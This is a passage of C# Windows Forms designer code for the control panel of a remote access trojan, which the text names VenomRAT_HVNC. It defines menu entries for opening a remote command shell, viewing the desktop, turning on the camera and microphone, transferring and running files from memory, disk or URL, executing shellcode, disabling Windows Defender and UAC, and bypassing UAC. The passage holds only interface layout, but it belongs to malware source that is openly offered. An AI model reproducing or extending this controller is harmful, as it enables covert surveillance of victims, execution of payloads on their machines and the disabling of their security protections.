			this.SettingToolStripMenuItem.Name = "SettingToolStripMenuItem";
			this.SettingToolStripMenuItem.Size = new global::System.Drawing.Size(111, 22);
			this.SettingToolStripMenuItem.Text = "Setting";
			this.SettingToolStripMenuItem.Click += new global::System.EventHandler(this.SettingToolStripMenuItem_Click);
			this.ExitToolStripMenuItem.Name = "ExitToolStripMenuItem";
			this.ExitToolStripMenuItem.Size = new global::System.Drawing.Size(111, 22);
			this.ExitToolStripMenuItem.Text = "Exit";
			this.ExitToolStripMenuItem.Click += new global::System.EventHandler(this.ExitToolStripMenuItem_Click);
			this.HelpToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[] { this.DocumentToolStripMenuItem, this.AboutToolStripMenuItem });
			this.HelpToolStripMenuItem.Name = "HelpToolStripMenuItem";
			this.HelpToolStripMenuItem.Size = new global::System.Drawing.Size(44, 20);
			this.HelpToolStripMenuItem.Text = "Help";
			this.DocumentToolStripMenuItem.Name = "DocumentToolStripMenuItem";
			this.DocumentToolStripMenuItem.Size = new global::System.Drawing.Size(130, 22);
			this.DocumentToolStripMenuItem.Text = "Document";
			this.DocumentToolStripMenuItem.Click += new global::System.EventHandler(this.DocumentToolStripMenuItem_Click);
			this.AboutToolStripMenuItem.Name = "AboutToolStripMenuItem";
			this.AboutToolStripMenuItem.Size = new global::System.Drawing.Size(130, 22);
			this.AboutToolStripMenuItem.Text = "About";
			this.AboutToolStripMenuItem.Click += new global::System.EventHandler(this.aboutToolStripMenuItem1_Click);
			this.menuStrip1.Dock = global::System.Windows.Forms.DockStyle.None;
			this.menuStrip1.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[] { this.FileToolStripMenuItem, this.HelpToolStripMenuItem });
			this.menuStrip1.Location = new global::System.Drawing.Point(533, 301);
			this.menuStrip1.Name = "menuStrip1";
			this.menuStrip1.Size = new global::System.Drawing.Size(89, 24);
			this.menuStrip1.TabIndex = 4;
			this.menuStrip1.Text = "menuStrip1";
			this.menuStrip1.ItemClicked += new global::System.Windows.Forms.ToolStripItemClickedEventHandler(this.menuStrip1_ItemClicked);
			this.ConnectTimeout.Enabled = true;
			this.ConnectTimeout.Interval = 5000;
			this.ConnectTimeout.Tick += new global::System.EventHandler(this.ConnectTimeout_Tick);
			this.TimerTask.Enabled = true;
			this.TimerTask.Interval = 5000;
			this.TimerTask.Tick += new global::System.EventHandler(this.TimerTask_Tick);
			this.notifyIcon1.Icon = ((System.Drawing.Icon)(resources.GetObject("notifyIcon1.Icon")));
			this.notifyIcon1.Text = "VenomRAT_HVNC";
			this.notifyIcon1.Visible = true;
			this.performanceCounter2.CategoryName = "Memory";
			this.performanceCounter2.CounterName = "% Committed Bytes In Use";
			this.performanceCounter1.CategoryName = "Processor";
			this.performanceCounter1.CounterName = "% Processor Time";
			this.performanceCounter1.InstanceName = "_Total";
			this.cLEARToolStripMenuItem.Name = "cLEARToolStripMenuItem";
			this.cLEARToolStripMenuItem.Size = new global::System.Drawing.Size(76, 22);
			this.cLEARToolStripMenuItem.Text = "Clear";
			this.cLEARToolStripMenuItem.Click += new global::System.EventHandler(this.CLEARToolStripMenuItem_Click);
			this.contextMenuLogs.ImageScalingSize = new global::System.Drawing.Size(24, 24);
			this.contextMenuLogs.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[] { this.cLEARToolStripMenuItem });
			this.contextMenuLogs.Name = "contextMenuLogs";
			this.contextMenuLogs.ShowImageMargin = false;
			this.contextMenuLogs.Size = new global::System.Drawing.Size(77, 26);
			this.UpdateUI.Enabled = true;
			this.UpdateUI.Interval = 500;
			this.UpdateUI.Tick += new global::System.EventHandler(this.UpdateUI_Tick);
			this.ping.Enabled = true;
			this.ping.Interval = 30000;
			this.ping.Tick += new global::System.EventHandler(this.ping_Tick);
			this.SystemControlToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[] { this.ClientControlToolStripMenuItem, this.toolStripSeparator13, this.SystemToolStripMenuItem });
			this.SystemControlToolStripMenuItem.ForeColor = global::System.Drawing.Color.Black;
			this.SystemControlToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("SystemControlToolStripMenuItem.Image")));
			this.SystemControlToolStripMenuItem.ImageTransparentColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.SystemControlToolStripMenuItem.Name = "SystemControlToolStripMenuItem";
			this.SystemControlToolStripMenuItem.Size = new global::System.Drawing.Size(230, 34);
			this.SystemControlToolStripMenuItem.Text = "Client Control";
			this.ClientControlToolStripMenuItem.BackColor = global::System.Drawing.Color.Black;
			this.ClientControlToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[] { this.UninstallToolStripMenuItem, this.toolStripSeparator23, this.StopToolStripMenuItem1, this.toolStripSeparator24, this.RestartToolStripMenuItem1, this.toolStripSeparator25, this.UpdateToolStripMenuItem });
			this.ClientControlToolStripMenuItem.ForeColor = global::System.Drawing.Color.Black;
			this.ClientControlToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("ClientControlToolStripMenuItem.Image")));
			this.ClientControlToolStripMenuItem.Name = "ClientControlToolStripMenuItem";
			this.ClientControlToolStripMenuItem.Size = new global::System.Drawing.Size(217, 34);
			this.ClientControlToolStripMenuItem.Text = "Connection Control";
			this.UninstallToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(12, 89, 71);
			this.UninstallToolStripMenuItem.ForeColor = global::System.Drawing.Color.Black;
			this.UninstallToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("UninstallToolStripMenuItem.Image")));
			this.UninstallToolStripMenuItem.Name = "UninstallToolStripMenuItem";
			this.UninstallToolStripMenuItem.Size = new global::System.Drawing.Size(180, 34);
			this.UninstallToolStripMenuItem.Text = "Uninstall";
			this.UninstallToolStripMenuItem.Click += new global::System.EventHandler(this.UninstallToolStripMenuItem_Click);
			this.toolStripSeparator23.Name = "toolStripSeparator23";
			this.toolStripSeparator23.Size = new global::System.Drawing.Size(177, 6);
			this.StopToolStripMenuItem1.BackColor = global::System.Drawing.Color.FromArgb(12, 89, 71);
			this.StopToolStripMenuItem1.ForeColor = global::System.Drawing.Color.Black;
			this.StopToolStripMenuItem1.Image = ((System.Drawing.Image)(resources.GetObject("StopToolStripMenuItem1.Image")));
			this.StopToolStripMenuItem1.Name = "StopToolStripMenuItem1";
			this.StopToolStripMenuItem1.Size = new global::System.Drawing.Size(180, 34);
			this.StopToolStripMenuItem1.Text = "Disconnecd";
			this.StopToolStripMenuItem1.Click += new global::System.EventHandler(this.StopToolStripMenuItem1_Click);
			this.toolStripSeparator24.Name = "toolStripSeparator24";
			this.toolStripSeparator24.Size = new global::System.Drawing.Size(177, 6);
			this.RestartToolStripMenuItem1.BackColor = global::System.Drawing.Color.FromArgb(12, 89, 71);
			this.RestartToolStripMenuItem1.ForeColor = global::System.Drawing.Color.Black;
			this.RestartToolStripMenuItem1.Image = ((System.Drawing.Image)(resources.GetObject("RestartToolStripMenuItem1.Image")));
			this.RestartToolStripMenuItem1.Name = "RestartToolStripMenuItem1";
			this.RestartToolStripMenuItem1.Size = new global::System.Drawing.Size(180, 34);
			this.RestartToolStripMenuItem1.Text = "Reconnect";
			this.RestartToolStripMenuItem1.Click += new global::System.EventHandler(this.RestartToolStripMenuItem1_Click);
			this.toolStripSeparator25.Name = "toolStripSeparator25";
			this.toolStripSeparator25.Size = new global::System.Drawing.Size(177, 6);
			this.UpdateToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(12, 89, 71);
			this.UpdateToolStripMenuItem.ForeColor = global::System.Drawing.Color.Black;
			this.UpdateToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("UpdateToolStripMenuItem.Image")));
			this.UpdateToolStripMenuItem.Name = "UpdateToolStripMenuItem";
			this.UpdateToolStripMenuItem.Size = new global::System.Drawing.Size(180, 34);
			this.UpdateToolStripMenuItem.Text = "Client Update";
			this.UpdateToolStripMenuItem.Click += new global::System.EventHandler(this.UpdateToolStripMenuItem_Click);
			this.toolStripSeparator13.Name = "toolStripSeparator13";
			this.toolStripSeparator13.Size = new global::System.Drawing.Size(214, 6);
			this.SystemToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(128, 64, 0);
			this.SystemToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[] { this.LogoutToolStripMenuItem, this.toolStripSeparator14, this.RebootToolStripMenuItem, this.toolStripSeparator15, this.ShutDownToolStripMenuItem });
			this.SystemToolStripMenuItem.ForeColor = global::System.Drawing.Color.Black;
			this.SystemToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("SystemToolStripMenuItem.Image")));
			this.SystemToolStripMenuItem.Name = "SystemToolStripMenuItem";
			this.SystemToolStripMenuItem.Size = new global::System.Drawing.Size(217, 34);
			this.SystemToolStripMenuItem.Text = "Client Restart";
			this.LogoutToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(12, 89, 71);
			this.LogoutToolStripMenuItem.ForeColor = global::System.Drawing.Color.Black;
			this.LogoutToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("LogoutToolStripMenuItem.Image")));
			this.LogoutToolStripMenuItem.Name = "LogoutToolStripMenuItem";
			this.LogoutToolStripMenuItem.Size = new global::System.Drawing.Size(161, 34);
			this.LogoutToolStripMenuItem.Text = "Logout";
			this.LogoutToolStripMenuItem.Click += new global::System.EventHandler(this.LogoutToolStripMenuItem_Click);
			this.toolStripSeparator14.Name = "toolStripSeparator14";
			this.toolStripSeparator14.Size = new global::System.Drawing.Size(158, 6);
			this.RebootToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(12, 89, 71);
			this.RebootToolStripMenuItem.ForeColor = global::System.Drawing.Color.Black;
			this.RebootToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("RebootToolStripMenuItem.Image")));
			this.RebootToolStripMenuItem.Name = "RebootToolStripMenuItem";
			this.RebootToolStripMenuItem.Size = new global::System.Drawing.Size(161, 34);
			this.RebootToolStripMenuItem.Text = "Reboot";
			this.RebootToolStripMenuItem.Click += new global::System.EventHandler(this.RebootToolStripMenuItem_Click);
			this.toolStripSeparator15.Name = "toolStripSeparator15";
			this.toolStripSeparator15.Size = new global::System.Drawing.Size(158, 6);
			this.ShutDownToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(12, 89, 71);
			this.ShutDownToolStripMenuItem.ForeColor = global::System.Drawing.Color.Black;
			this.ShutDownToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("ShutDownToolStripMenuItem.Image")));
			this.ShutDownToolStripMenuItem.Name = "ShutDownToolStripMenuItem";
			this.ShutDownToolStripMenuItem.Size = new global::System.Drawing.Size(161, 34);
			this.ShutDownToolStripMenuItem.Text = "Shut Down";
			this.ShutDownToolStripMenuItem.Click += new global::System.EventHandler(this.ShutDownToolStripMenuItem_Click);
			this.RemoteManagerToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.RemoteShellToolStripMenuItem, this.toolStripSeparator16, this.RemoteScreenToolStripMenuItem, this.toolStripSeparator17, this.RemoteCameraToolStripMenuItem, this.toolStripSeparator18, this.FileManagerToolStripMenuItem1, this.toolStripSeparator19, this.remoteRegeditToolStripMenuItem, this.toolStripSeparator20,
				this.ProcessManagerToolStripMenuItem, this.toolStripSeparator21, this.netstatToolStripMenuItem, this.toolStripSeparator22, this.RecordToolStripMenuItem
			});
			this.RemoteManagerToolStripMenuItem.Font = new global::System.Drawing.Font("Segoe UI", 11.25f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.RemoteManagerToolStripMenuItem.ForeColor = global::System.Drawing.Color.Black;
			this.RemoteManagerToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("RemoteManagerToolStripMenuItem.Image")));
			this.RemoteManagerToolStripMenuItem.ImageTransparentColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.RemoteManagerToolStripMenuItem.Name = "RemoteManagerToolStripMenuItem";
			this.RemoteManagerToolStripMenuItem.Size = new global::System.Drawing.Size(230, 34);
			this.RemoteManagerToolStripMenuItem.Text = "Control Management";
			this.RemoteManagerToolStripMenuItem.TextImageRelation = global::System.Windows.Forms.TextImageRelation.TextAboveImage;
			this.RemoteShellToolStripMenuItem.ForeColor = global::System.Drawing.Color.Black;
			this.RemoteShellToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("RemoteShellToolStripMenuItem.Image")));
			this.RemoteShellToolStripMenuItem.Name = "RemoteShellToolStripMenuItem";
			this.RemoteShellToolStripMenuItem.Size = new global::System.Drawing.Size(202, 24);
			this.RemoteShellToolStripMenuItem.Text = "Open CMD";
			this.RemoteShellToolStripMenuItem.Click += new global::System.EventHandler(this.RemoteShellToolStripMenuItem_Click);
			this.toolStripSeparator16.Name = "toolStripSeparator16";
			this.toolStripSeparator16.Size = new global::System.Drawing.Size(199, 6);
			this.RemoteScreenToolStripMenuItem.BackColor = global::System.Drawing.Color.Black;
			this.RemoteScreenToolStripMenuItem.ForeColor = global::System.Drawing.Color.Black;
			this.RemoteScreenToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("RemoteScreenToolStripMenuItem.Image")));
			this.RemoteScreenToolStripMenuItem.Name = "RemoteScreenToolStripMenuItem";
			this.RemoteScreenToolStripMenuItem.Size = new global::System.Drawing.Size(202, 24);
			this.RemoteScreenToolStripMenuItem.Text = "Remote Desktop";
			this.RemoteScreenToolStripMenuItem.Click += new global::System.EventHandler(this.RemoteScreenToolStripMenuItem_Click);
			this.toolStripSeparator17.Name = "toolStripSeparator17";
			this.toolStripSeparator17.Size = new global::System.Drawing.Size(199, 6);
			this.RemoteCameraToolStripMenuItem.BackColor = global::System.Drawing.Color.Black;
			this.RemoteCameraToolStripMenuItem.ForeColor = global::System.Drawing.Color.Black;
			this.RemoteCameraToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("RemoteCameraToolStripMenuItem.Image")));
			this.RemoteCameraToolStripMenuItem.Name = "RemoteCameraToolStripMenuItem";
			this.RemoteCameraToolStripMenuItem.Size = new global::System.Drawing.Size(202, 24);
			this.RemoteCameraToolStripMenuItem.Text = "Open Camera";
			this.RemoteCameraToolStripMenuItem.Click += new global::System.EventHandler(this.RemoteCameraToolStripMenuItem_Click);
			this.toolStripSeparator18.Name = "toolStripSeparator18";
			this.toolStripSeparator18.Size = new global::System.Drawing.Size(199, 6);
			this.FileManagerToolStripMenuItem1.BackColor = global::System.Drawing.Color.Black;
			this.FileManagerToolStripMenuItem1.ForeColor = global::System.Drawing.Color.Black;
			this.FileManagerToolStripMenuItem1.Image = ((System.Drawing.Image)(resources.GetObject("FileManagerToolStripMenuItem1.Image")));
			this.FileManagerToolStripMenuItem1.Name = "FileManagerToolStripMenuItem1";
			this.FileManagerToolStripMenuItem1.Size = new global::System.Drawing.Size(202, 24);
			this.FileManagerToolStripMenuItem1.Text = "File Manager";
			this.FileManagerToolStripMenuItem1.Click += new global::System.EventHandler(this.FileManagerToolStripMenuItem1_Click);
			this.toolStripSeparator19.Name = "toolStripSeparator19";
			this.toolStripSeparator19.Size = new global::System.Drawing.Size(199, 6);
			this.remoteRegeditToolStripMenuItem.BackColor = global::System.Drawing.Color.Black;
			this.remoteRegeditToolStripMenuItem.ForeColor = global::System.Drawing.Color.Black;
			this.remoteRegeditToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("remoteRegeditToolStripMenuItem.Image")));
			this.remoteRegeditToolStripMenuItem.Name = "remoteRegeditToolStripMenuItem";
			this.remoteRegeditToolStripMenuItem.Size = new global::System.Drawing.Size(202, 24);
			this.remoteRegeditToolStripMenuItem.Text = "Regedit";
			this.remoteRegeditToolStripMenuItem.Click += new global::System.EventHandler(this.remoteRegeditToolStripMenuItem_Click);
			this.toolStripSeparator20.Name = "toolStripSeparator20";
			this.toolStripSeparator20.Size = new global::System.Drawing.Size(199, 6);
			this.ProcessManagerToolStripMenuItem.BackColor = global::System.Drawing.Color.Black;
			this.ProcessManagerToolStripMenuItem.ForeColor = global::System.Drawing.Color.Black;
			this.ProcessManagerToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("ProcessManagerToolStripMenuItem.Image")));
			this.ProcessManagerToolStripMenuItem.Name = "ProcessManagerToolStripMenuItem";
			this.ProcessManagerToolStripMenuItem.Size = new global::System.Drawing.Size(202, 24);
			this.ProcessManagerToolStripMenuItem.Text = "Process Manager";
			this.ProcessManagerToolStripMenuItem.Click += new global::System.EventHandler(this.ProcessManagerToolStripMenuItem_Click);
			this.toolStripSeparator21.Name = "toolStripSeparator21";
			this.toolStripSeparator21.Size = new global::System.Drawing.Size(199, 6);
			this.netstatToolStripMenuItem.BackColor = global::System.Drawing.Color.Black;
			this.netstatToolStripMenuItem.ForeColor = global::System.Drawing.Color.Black;
			this.netstatToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("netstatToolStripMenuItem.Image")));
			this.netstatToolStripMenuItem.Name = "netstatToolStripMenuItem";
			this.netstatToolStripMenuItem.Size = new global::System.Drawing.Size(202, 24);
			this.netstatToolStripMenuItem.Text = "Networks Statistics";
			this.netstatToolStripMenuItem.Click += new global::System.EventHandler(this.netstatToolStripMenuItem_Click);
			this.toolStripSeparator22.Name = "toolStripSeparator22";
			this.toolStripSeparator22.Size = new global::System.Drawing.Size(199, 6);
			this.RecordToolStripMenuItem.BackColor = global::System.Drawing.Color.Black;
			this.RecordToolStripMenuItem.ForeColor = global::System.Drawing.Color.Black;
			this.RecordToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("RecordToolStripMenuItem.Image")));
			this.RecordToolStripMenuItem.Name = "RecordToolStripMenuItem";
			this.RecordToolStripMenuItem.Size = new global::System.Drawing.Size(202, 24);
			this.RecordToolStripMenuItem.Text = "Mic Record";
			this.RecordToolStripMenuItem.Click += new global::System.EventHandler(this.RecordToolStripMenuItem_Click);
			this.RemoteControlToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[] { this.SendFileToolStripMenuItem1, this.toolStripSeparator28, this.VisteWebsiteToolStripMenuItem1, this.toolStripSeparator29, this.runShellcodeToolStripMenuItem, this.toolStripSeparator30, this.ChangeWallpaperToolStripMenuItem1, this.toolStripSeparator31, this.FileSearchToolStripMenuItem });
			this.RemoteControlToolStripMenuItem.Font = new global::System.Drawing.Font("Segoe UI", 11.25f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.RemoteControlToolStripMenuItem.ForeColor = global::System.Drawing.Color.Black;
			this.RemoteControlToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("RemoteControlToolStripMenuItem.Image")));
			this.RemoteControlToolStripMenuItem.ImageTransparentColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.RemoteControlToolStripMenuItem.Name = "RemoteControlToolStripMenuItem";
			this.RemoteControlToolStripMenuItem.Size = new global::System.Drawing.Size(230, 34);
			this.RemoteControlToolStripMenuItem.Text = "Control";
			this.SendFileToolStripMenuItem1.BackColor = global::System.Drawing.Color.FromArgb(12, 89, 71);
			this.SendFileToolStripMenuItem1.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[] { this.SendFileToMemoryToolStripMenuItem, this.toolStripSeparator26, this.SendFileToDiskToolStripMenuItem, this.toolStripSeparator27, this.fromUrlToolStripMenuItem });
			this.SendFileToolStripMenuItem1.ForeColor = global::System.Drawing.Color.Black;
			this.SendFileToolStripMenuItem1.Image = ((System.Drawing.Image)(resources.GetObject("SendFileToolStripMenuItem1.Image")));
			this.SendFileToolStripMenuItem1.Name = "SendFileToolStripMenuItem1";
			this.SendFileToolStripMenuItem1.Size = new global::System.Drawing.Size(200, 24);
			this.SendFileToolStripMenuItem1.Text = "Transfer File";
			this.SendFileToMemoryToolStripMenuItem.BackColor = global::System.Drawing.Color.Transparent;
			this.SendFileToMemoryToolStripMenuItem.ForeColor = global::System.Drawing.Color.Black;
			this.SendFileToMemoryToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("SendFileToMemoryToolStripMenuItem.Image")));
			this.SendFileToMemoryToolStripMenuItem.ImageTransparentColor = global::System.Drawing.Color.Red;
			this.SendFileToMemoryToolStripMenuItem.Name = "SendFileToMemoryToolStripMenuItem";
			this.SendFileToMemoryToolStripMenuItem.Size = new global::System.Drawing.Size(236, 24);
			this.SendFileToMemoryToolStripMenuItem.Text = "Transfer File To Memory";
			this.SendFileToMemoryToolStripMenuItem.Click += new global::System.EventHandler(this.SendFileToMemoryToolStripMenuItem_Click);
			this.toolStripSeparator26.Name = "toolStripSeparator26";
			this.toolStripSeparator26.Size = new global::System.Drawing.Size(233, 6);
			this.SendFileToDiskToolStripMenuItem.BackColor = global::System.Drawing.Color.Transparent;
			this.SendFileToDiskToolStripMenuItem.ForeColor = global::System.Drawing.Color.Black;
			this.SendFileToDiskToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("SendFileToDiskToolStripMenuItem.Image")));
			this.SendFileToDiskToolStripMenuItem.ImageTransparentColor = global::System.Drawing.Color.Red;
			this.SendFileToDiskToolStripMenuItem.Name = "SendFileToDiskToolStripMenuItem";
			this.SendFileToDiskToolStripMenuItem.Size = new global::System.Drawing.Size(236, 24);
			this.SendFileToDiskToolStripMenuItem.Text = "Transfer File To Disk";
			this.SendFileToDiskToolStripMenuItem.Click += new global::System.EventHandler(this.SendFileToDiskToolStripMenuItem_Click);
			this.toolStripSeparator27.Name = "toolStripSeparator27";
			this.toolStripSeparator27.Size = new global::System.Drawing.Size(233, 6);
			this.fromUrlToolStripMenuItem.BackColor = global::System.Drawing.Color.Transparent;
			this.fromUrlToolStripMenuItem.ForeColor = global::System.Drawing.Color.Black;
			this.fromUrlToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("fromUrlToolStripMenuItem.Image")));
			this.fromUrlToolStripMenuItem.ImageTransparentColor = global::System.Drawing.Color.Red;
			this.fromUrlToolStripMenuItem.Name = "fromUrlToolStripMenuItem";
			this.fromUrlToolStripMenuItem.Size = new global::System.Drawing.Size(236, 24);
			this.fromUrlToolStripMenuItem.Text = "From Url";
			this.fromUrlToolStripMenuItem.Click += new global::System.EventHandler(this.fromUrlToolStripMenuItem_Click);
			this.toolStripSeparator28.Name = "toolStripSeparator28";
			this.toolStripSeparator28.Size = new global::System.Drawing.Size(197, 6);
			this.VisteWebsiteToolStripMenuItem1.BackColor = global::System.Drawing.Color.FromArgb(12, 89, 71);
			this.VisteWebsiteToolStripMenuItem1.ForeColor = global::System.Drawing.Color.Black;
			this.VisteWebsiteToolStripMenuItem1.Image = ((System.Drawing.Image)(resources.GetObject("VisteWebsiteToolStripMenuItem1.Image")));
			this.VisteWebsiteToolStripMenuItem1.Name = "VisteWebsiteToolStripMenuItem1";
			this.VisteWebsiteToolStripMenuItem1.Size = new global::System.Drawing.Size(211, 34);
			this.VisteWebsiteToolStripMenuItem1.Text = "Visit Website";
			this.VisteWebsiteToolStripMenuItem1.Click += new global::System.EventHandler(this.VisteWebsiteToolStripMenuItem1_Click);
			this.toolStripSeparator29.Name = "toolStripSeparator29";
			this.toolStripSeparator29.Size = new global::System.Drawing.Size(197, 6);
			this.runShellcodeToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(12, 89, 71);
			this.runShellcodeToolStripMenuItem.ForeColor = global::System.Drawing.Color.Black;
			this.runShellcodeToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("runShellcodeToolStripMenuItem.Image")));
			this.runShellcodeToolStripMenuItem.Name = "runShellcodeToolStripMenuItem";
			this.runShellcodeToolStripMenuItem.Size = new global::System.Drawing.Size(200, 24);
			this.runShellcodeToolStripMenuItem.Text = "Execute Shellcode";
			this.runShellcodeToolStripMenuItem.Click += new global::System.EventHandler(this.runShellcodeToolStripMenuItem_Click);
			this.toolStripSeparator30.Name = "toolStripSeparator30";
			this.toolStripSeparator30.Size = new global::System.Drawing.Size(197, 6);
			this.ChangeWallpaperToolStripMenuItem1.BackColor = global::System.Drawing.Color.FromArgb(12, 89, 71);
			this.ChangeWallpaperToolStripMenuItem1.ForeColor = global::System.Drawing.Color.Black;
			this.ChangeWallpaperToolStripMenuItem1.Image = ((System.Drawing.Image)(resources.GetObject("ChangeWallpaperToolStripMenuItem1.Image")));
			this.ChangeWallpaperToolStripMenuItem1.Name = "ChangeWallpaperToolStripMenuItem1";
			this.ChangeWallpaperToolStripMenuItem1.Size = new global::System.Drawing.Size(200, 24);
			this.ChangeWallpaperToolStripMenuItem1.Text = "Change Wallpaper";
			this.ChangeWallpaperToolStripMenuItem1.Click += new global::System.EventHandler(this.ChangeWallpaperToolStripMenuItem1_Click);
			this.toolStripSeparator31.Name = "toolStripSeparator31";
			this.toolStripSeparator31.Size = new global::System.Drawing.Size(197, 6);
			this.FileSearchToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(12, 89, 71);
			this.FileSearchToolStripMenuItem.ForeColor = global::System.Drawing.Color.Black;
			this.FileSearchToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("FileSearchToolStripMenuItem.Image")));
			this.FileSearchToolStripMenuItem.Name = "FileSearchToolStripMenuItem";
			this.FileSearchToolStripMenuItem.Size = new global::System.Drawing.Size(200, 24);
			this.FileSearchToolStripMenuItem.Text = "File Search";
			this.FileSearchToolStripMenuItem.Click += new global::System.EventHandler(this.FileSearchToolStripMenuItem_Click);
			this.MalwareToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[] { this.DisableWDToolStripMenuItem, this.toolStripSeparator32, this.DisableUACToolStripMenuItem });
			this.MalwareToolStripMenuItem.ForeColor = global::System.Drawing.Color.Black;
			this.MalwareToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("MalwareToolStripMenuItem.Image")));
			this.MalwareToolStripMenuItem.ImageTransparentColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.MalwareToolStripMenuItem.Name = "MalwareToolStripMenuItem";
			this.MalwareToolStripMenuItem.Size = new global::System.Drawing.Size(230, 34);
			this.MalwareToolStripMenuItem.Text = "WD Bypassing";
			this.DisableWDToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(12, 89, 71);
			this.DisableWDToolStripMenuItem.ForeColor = global::System.Drawing.Color.Black;
			this.DisableWDToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("DisableWDToolStripMenuItem.Image")));
			this.DisableWDToolStripMenuItem.Name = "DisableWDToolStripMenuItem";
			this.DisableWDToolStripMenuItem.Size = new global::System.Drawing.Size(172, 34);
			this.DisableWDToolStripMenuItem.Text = "Disable WD";
			this.DisableWDToolStripMenuItem.Click += new global::System.EventHandler(this.DisableWDToolStripMenuItem_Click);
			this.toolStripSeparator32.Name = "toolStripSeparator32";
			this.toolStripSeparator32.Size = new global::System.Drawing.Size(169, 6);
			this.DisableUACToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(12, 89, 71);
			this.DisableUACToolStripMenuItem.ForeColor = global::System.Drawing.Color.Black;
			this.DisableUACToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("DisableUACToolStripMenuItem.Image")));
			this.DisableUACToolStripMenuItem.Name = "DisableUACToolStripMenuItem";
			this.DisableUACToolStripMenuItem.Size = new global::System.Drawing.Size(172, 34);
			this.DisableUACToolStripMenuItem.Text = "Disable UAC";
			this.DisableUACToolStripMenuItem.Click += new global::System.EventHandler(this.DisableUACToolStripMenuItem_Click);
			this.BypassUACAToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.BypassUACAToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[] { this.SilentCleanupToolStripMenuItem, this.toolStripSeparator33, this.RunasToolStripMenuItem });
			this.BypassUACAToolStripMenuItem.ForeColor = global::System.Drawing.Color.Black;
			this.BypassUACAToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("BypassUACAToolStripMenuItem.Image")));
			this.BypassUACAToolStripMenuItem.ImageTransparentColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.BypassUACAToolStripMenuItem.Name = "BypassUACAToolStripMenuItem";
			this.BypassUACAToolStripMenuItem.ShowShortcutKeys = false;
			this.BypassUACAToolStripMenuItem.Size = new global::System.Drawing.Size(230, 34);
			this.BypassUACAToolStripMenuItem.Text = "UAC Privileges";
			this.SilentCleanupToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(12, 89, 71);
			this.SilentCleanupToolStripMenuItem.ForeColor = global::System.Drawing.Color.Black;
			this.SilentCleanupToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("SilentCleanupToolStripMenuItem.Image")));
			this.SilentCleanupToolStripMenuItem.Name = "SilentCleanupToolStripMenuItem";
			this.SilentCleanupToolStripMenuItem.Size = new global::System.Drawing.Size(315, 34);
			this.SilentCleanupToolStripMenuItem.Text = "Privileges Windows 8.1/10/Servers";
			this.SilentCleanupToolStripMenuItem.Click += new global::System.EventHandler(this.SilentCleanupToolStripMenuItem_Click);
			this.toolStripSeparator33.Name = "toolStripSeparator33";
			this.toolStripSeparator33.Size = new global::System.Drawing.Size(312, 6);
			this.RunasToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(12, 89, 71);
			this.RunasToolStripMenuItem.ForeColor = global::System.Drawing.Color.Black;
			this.RunasToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("RunasToolStripMenuItem.Image")));
